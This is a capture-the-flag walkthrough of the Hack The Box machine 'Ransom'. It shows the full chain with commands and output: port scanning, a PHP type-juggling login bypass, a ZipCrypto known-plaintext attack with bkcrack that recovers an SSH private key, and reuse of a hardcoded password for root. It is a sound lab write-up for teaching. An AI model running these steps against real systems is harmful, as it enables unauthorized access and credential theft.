<h2 id="attack-chain">Attack chain</h2>
<p>Ransom follows four stages:</p>
<blockquote>
<p>A hacker is not someone who randomly tries things. A hacker is someone who <strong>understands systems deeply enough to make them do something unintended</strong>.</p>
</blockquote>
<p>The methodology here is:</p>
<ol>
<li><strong>Enumerate</strong> : find every door and window before trying to open one</li>
<li><strong>Understand</strong> : know what tech stack you're dealing with before attacking it</li>
<li><strong>Exploit</strong> : use the smallest, most precise attack that works</li>
<li><strong>Escalate</strong> : once inside, treat the system like a puzzle; what was left behind?</li>
</ol>
<p>Every step below follows this loop.</p>
<hr>
<h2 id="step-1-port-scanning">Step 1: Port Scanning</h2>

<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.93
</code></pre>

<p>Before anything else, we need to know what services are <strong>listening for connections</strong>. A port is a numbered door on a machine. Open ports = potential entry points.</p>
<ul>
<li><code>-p-</code> means scan <strong>all 65535 ports</strong>, not just the common top 1000. Defenders sometimes hide services on unusual ports. We never assume only standard ports are in use.</li>
<li><code>--min-rate 10000</code> speeds the scan up significantly. On HTB, speed is fine - in real engagements you'd slow down to avoid detection.</li>
</ul>




<pre><code>22/tcp open  ssh
80/tcp open  http
</code></pre>
<p>Two ports. Small attack surface. Both are standard - SSH for remote shell access and HTTP for a web application. The web app is almost always the primary entry point on HTB boxes.</p>
<hr>
<h2 id="step-2-service-enumeration">Step 2: Service Enumeration</h2>

<pre><code class="language-bash" data-language="bash">nmap -p 22,80 -sCV 10.129.227.93
</code></pre>

<p>Now we know the doors exist. We need to know <strong>what's behind each door</strong>. This scan:</p>
<ul>
<li><code>-sC</code> runs default scripts - they probe each service and pull useful info automatically</li>
<li><code>-sV</code> detects the exact software version running</li>
</ul>
<p>Version information is critical because:</p>
<ul>
<li>Specific versions may have known CVEs</li>
<li>Version info tells us the OS (Ubuntu 20.04 in this case from OpenSSH version)</li>
<li>Framework versions affect what vulnerabilities exist</li>
</ul>

<pre><code>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http    Apache httpd 2.4.41
                     Redirected to http://10.129.227.93/login
</code></pre>
<p>Key observations:</p>
<ul>
<li>SSH is OpenSSH 8.2p1 - no known exploitable CVEs, so we park this for now</li>
<li>The web server redirects to <code>/login</code> : there's a login page we need to deal with</li>
<li>Apache 2.4.41 + Ubuntu 20.04 focal - this helps if we need to match exploits later</li>
</ul>

<p>"SSH with no CVEs = not my first target. The web app is where the action is."</p>

<hr>
<h2 id="step-3-web-reconnaissance">Step 3: Web Reconnaissance</h2>

<p>Visit <code>http://10.129.227.93</code> in a browser (or curl). Observe the login page. View page source.</p>
<pre><code class="language-bash" data-language="bash">curl -s http://10.129.227.93/login | grep -A 30 '&lt;script&gt;'
</code></pre>

<p>When you see a login page, don't immediately start guessing passwords. <strong>Read the code first</strong>. Modern web apps handle login through JavaScript - understanding how the JS works tells you exactly what request is being made, to which endpoint, with what parameters.</p>
<p>From the page source, the relevant JavaScript is:</p>
<pre><code class="language-javascript" data-language="javascript">$('#loginform').submit(function() {
    $.ajax({
        type: "GET",
        url: 'api/login',
        data: {
            password: $("#password").val()
        },
        success: function(data) {
            if (data === 'Login Successful') {
                window.location.replace('/');
            }
        }
    });
});
</code></pre>
<h3 id="what-this-tells-us">What this tells us</h3>
<ol>
<li>Login is a <strong>GET request</strong> to <code>/api/login</code> : unusual. Normally logins are POST.</li>
<li>The password is sent as a <strong>URL query parameter</strong>: <code>/api/login?password=...</code></li>
<li>The server responds with the string <code>"Login Successful"</code> or <code>"Invalid Login"</code></li>
</ol>

<p>"The login is using GET - that's already weird. Passwords in GET requests get logged everywhere. What else is non-standard here? What if I change the data format?"</p>

<p>We also identify the tech stack:</p>
<pre><code class="language-bash" data-language="bash">curl -I http://10.129.227.93
</code></pre>
<p>Response headers show <code>laravel_session</code> cookies → this is a <strong>Laravel</strong> (PHP framework) application. This is critical because Laravel has specific behaviors around how it parses request bodies.</p>
<hr>
<h2 id="step-4-login-bypass-php-type-juggling">Step 4: Login Bypass (PHP Type Juggling)</h2>
<h3 id="the-vulnerability">The Vulnerability</h3>
<p>Laravel (and PHP in general) can parse JSON bodies even on GET requests if the <code>Content-Type: application/json</code> header is present. More importantly, PHP's loose comparison operator <code>==</code> has a dangerous property:</p>
<pre><code class="language-php" data-language="php">true == "any string at all"  // evaluates to TRUE
</code></pre>
<p>This is called <strong>type juggling</strong>. When PHP compares a boolean <code>true</code> to any non-empty string using <code>==</code>, the string gets converted to boolean <code>true</code>, and <code>true == true</code> is always true.</p>
<p>The server-side code (as we'll confirm later) looks like:</p>
<pre><code class="language-php" data-language="php">if ($request-&gt;get('password') == "UHC-March-Global-PW!") {
    return "Login Successful";
}
</code></pre>
<p>If we send <code>{"password": true}</code> as JSON, PHP receives the boolean <code>true</code>, and <code>true == "UHC-March-Global-PW!"</code> evaluates to <code>true</code> - login bypassed.</p>

<pre><code class="language-bash" data-language="bash">curl -s -X GET http://10.129.227.93/api/login \
  -H 'Content-Type: application/json' \
  -d '{"password": true}'
</code></pre>
<h3 id="mechanism-step-by-step">Mechanism step by step</h3>
<ol>
<li>We send a <strong>GET request</strong> (matching the only allowed method)</li>
<li>We set <code>Content-Type: application/json</code> : this tells Laravel to parse the body as JSON</li>
<li>Laravel's request object reads <code>password</code> from the JSON body</li>
<li>PHP compares: <code>true == "UHC-March-Global-PW!"</code> → <code>true</code></li>
<li>Server returns: <code>"Login Successful"</code></li>
</ol>



<p>This is the core of type juggling attacks: <strong>don't just try different values - try different data types</strong>.</p>

<pre><code>Login Successful
</code></pre>

<h2 id="step-5-authenticated-session-and-file-download">Step 5: Authenticated Session &amp; File Download</h2>
<h3 id="the-problem">The problem</h3>
<p>Getting <code>"Login Successful"</code> from the API is not enough on its own. The browser maintains a <strong>session cookie</strong> that tracks whether you're logged in. We need to:</p>
<ol>
<li>Get a fresh session cookie from the login page</li>
<li>Send the bypass through that same session</li>
<li>Use the now-authenticated session to browse the app</li>
</ol>

<pre><code class="language-bash" data-language="bash"># Step 1: Get the session cookie
curl -s -c /tmp/cookies.txt http://10.129.227.93/login &gt; /dev/null

# Step 2: Authenticate using the bypass
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt -X GET http://10.129.227.93/api/login \
  -H 'Content-Type: application/json' \
  -d '{"password": true}'

# Step 3: Access the authenticated page and find file links
curl -s -b /tmp/cookies.txt http://10.129.227.93/ -o /tmp/page.html
grep -oP 'href="[^"]*"' /tmp/page.html
</code></pre>

<ul>
<li><code>-c /tmp/cookies.txt</code> saves cookies to a file</li>
<li><code>-b /tmp/cookies.txt</code> sends those saved cookies with each request</li>
<li>This simulates what a browser does automatically - maintaining session state</li>
</ul>

<p>Two interesting links on the authenticated page:</p>
<pre><code>href="/uploaded-file-3422.zip"
href="/user.txt"
</code></pre>
<h3 id="download-both-files">Download both files</h3>
<pre><code class="language-bash" data-language="bash"># Grab the user flag
curl -s -b /tmp/cookies.txt http://10.129.227.93/user.txt

# Grab the encrypted zip
curl -s -b /tmp/cookies.txt http://10.129.227.93/uploaded-file-3422.zip \
  -o /tmp/uploaded-file-3422.zip
</code></pre>
<p><strong>User flag:</strong> <code>69f82c[redacted]aae72ae</code></p>

<h2 id="step-6-analyzing-the-encrypted-zip">Step 6: Analyzing the Encrypted ZIP</h2>

<pre><code class="language-bash" data-language="bash">7z l -slt /tmp/uploaded-file-3422.zip
</code></pre>

<p>Before trying to crack a password-protected file, understand <strong>what type of encryption</strong> it uses. <code>7z l -slt</code> lists files with full technical metadata including the encryption method.</p>
<p>Key output:</p>
<pre><code>Method = ZipCrypto Deflate
CRC = 6CE3189B
</code></pre>
<h3 id="zip-encryption-details">ZIP encryption details</h3>
<p>There are two common ZIP encryption methods:</p>
<ul>
<li><strong>AES-256</strong>: Modern, strong - essentially uncrackable without the password</li>
<li><strong>ZipCrypto</strong>: Legacy, from the 1990s - <strong>vulnerable to known-plaintext attack</strong></li>
</ul>
<p>ZipCrypto is broken. If you know the exact content of <strong>any one file</strong> inside the zip, you can recover the internal encryption keys and decrypt the entire archive - no password needed.</p>
<p>The archive contains <code>.bash_logout</code> - a standard Ubuntu file that is almost never changed. The CRC32 value (<code>6CE3189B</code>) is a checksum of the decrypted file. We can verify our local copy matches:</p>
<pre><code class="language-bash" data-language="bash">python3 -c "
import binascii
with open('/home/kali/.bash_logout', 'rb') as f:
    data = f.read()
print('Size:', len(data))
print('CRC32:', hex(binascii.crc32(data) &amp; 0xFFFFFFFF))
"
</code></pre>
<p>Output:</p>
<pre><code>Size: 220
CRC32: 0x6ce3189b
</code></pre>
<p><strong>Perfect match.</strong> Our local <code>.bash_logout</code> is identical to the one in the encrypted zip. We have our known plaintext.</p>



<hr>
<h2 id="step-7-known-plaintext-attack-with-bkcrack">Step 7: Known-Plaintext Attack with bkcrack</h2>

<pre><code class="language-bash" data-language="bash"># Create an unencrypted zip with our known plaintext file
cd /tmp &amp;&amp; zip plain.zip bash_logout

# Run the known-plaintext attack
bkcrack -C /tmp/uploaded-file-3422.zip -c .bash_logout -P /tmp/plain.zip -p bash_logout
</code></pre>

<p><code>bkcrack</code> implements the Biham-Kocher known-plaintext attack against ZipCrypto. It needs:</p>
<ul>
<li><code>-C</code> : the encrypted zip (the target)</li>
<li><code>-c</code> : the name of the known file <strong>inside</strong> the encrypted zip</li>
<li><code>-P</code> : an unencrypted zip containing our copy of that file</li>
<li><code>-p</code> : the name of our copy inside the unencrypted zip</li>
</ul>
<p>The attack works by:</p>
<ol>
<li>Using the known plaintext to derive the internal PRNG state of the ZipCrypto cipher</li>
<li>Recovering the three 32-bit internal keys that control the entire encryption</li>
<li>Using those keys to decrypt everything else in the archive</li>
</ol>
<p>This typically takes 1-3 minutes. The math involves reducing 2^96 possible states down to a tractable search space using the known bytes.</p>

<pre><code>Keys: 7b549874 ebc25ec5 7e465e18
</code></pre>



<hr>
<h2 id="step-8-unlocking-the-zip-and-extracting-the-ssh-key">Step 8: Unlocking the ZIP &amp; Extracting the SSH Key</h2>

<pre><code class="language-bash" data-language="bash"># Use the recovered keys to create a new zip with a known password
bkcrack -C /tmp/uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 \
  -U /tmp/unlocked.zip pass

# Extract everything
unzip -P pass /tmp/unlocked.zip -d /tmp/unzipped/
</code></pre>

<p>The recovered keys let <code>bkcrack</code> re-encrypt the archive with any password we choose. We pick <code>pass</code> - simple and memorable. Then we extract normally.</p>

<pre><code>/tmp/unzipped/.ssh/id_rsa      ← private SSH key
/tmp/unzipped/.ssh/id_rsa.pub  ← public key (shows username: htb@ransom)
</code></pre>
<p>The public key ends with <code>htb@ransom</code> - this tells us the username is <code>htb</code>.</p>
<hr>
<h2 id="step-9-ssh-access-as-htb">Step 9: SSH Access as htb</h2>

<pre><code class="language-bash" data-language="bash">ssh -i /tmp/unzipped/.ssh/id_rsa htb@10.129.227.93
</code></pre>

<p>SSH key authentication uses asymmetric cryptography. The private key (<code>id_rsa</code>) proves identity without a password. Since the public key (<code>id_rsa.pub</code>) is in the user's <code>~/.ssh/authorized_keys</code>, the server accepts our private key as proof we are that user.</p>

<p>"The zip contained the user's entire home directory - including their SSH keys. They backed up their home dir and served it through a web app with weak encryption. Now I have their private key and can impersonate them."</p>

<h2 id="step-10-privilege-escalation-to-root">Step 10: Privilege Escalation to Root</h2>
<h3 id="enumeration-approach">Enumeration approach</h3>
<p>Once you have a shell, resist the urge to randomly run <code>sudo -l</code> and <code>linpeas</code> immediately. <strong>Think about what you already know:</strong></p>
<ul>
<li>This is a Laravel web application</li>
<li>The login had a hardcoded password comparison in the source code</li>
<li>We haven't read that source yet - and hardcoded credentials often get reused</li>
</ul>

<p>Find the authentication controller and read the source:</p>
<pre><code class="language-bash" data-language="bash">cat /srv/prod/app/Http/Controllers/AuthController.php
</code></pre>

<h2 id="key-lessons">Key Lessons</h2>
<h3 id="1-always-read-source-code-js-before-attacking-a-login">1. Always read source code / JS before attacking a login</h3>
<p>The JavaScript told us exactly how the login worked - a GET request with a password parameter. Without reading it, we'd waste time on SQLi and brute force.</p>
<h3 id="2-data-type-matters-as-much-as-data-value">2. Data type matters as much as data value</h3>
<p>The type juggling bypass worked not because we found the right password - we changed the <strong>type</strong> of what we sent. <code>true</code> bypassed the check entirely. In PHP (and other weakly typed languages), <code>==</code> compares loosely - always look for type confusion opportunities.</p>
<h3 id="3-legacy-encryption-is-often-just-theater">3. Legacy encryption is often just theater</h3>
<p>ZipCrypto encryption provides a false sense of security. The moment you see <code>Method = ZipCrypto</code> in a zip file, treat it as effectively unencrypted if you have any known plaintext. Modern tools like bkcrack make this trivial.</p>
<h3 id="4-home-directory-backups-are-useful-sources">4. Home directory backups are useful sources</h3>
<p>If an application serves a user's home directory backup, that zip contains:</p>
<ul>
<li>SSH keys</li>
<li>Shell history</li>
<li>Browser profiles</li>
<li>Credentials in dotfiles
Always enumerate every file in such archives.</li>
</ul>
<h3 id="5-hardcoded-credentials-get-reused">5. Hardcoded credentials get reused</h3>
<p>The password in the PHP source was the root password. Always try every credential you find against every authentication point: <code>su</code>, <code>sudo</code>, SSH for other users, database logins, etc.</p>
<h3 id="6-enumeration-order-matters">6. Enumeration order matters</h3>
<p>We went: web app → auth bypass → download files → crack zip → SSH → read source → su root. Each step gave us exactly what we needed for the next. This is why methodology beats random tool-running.</p>
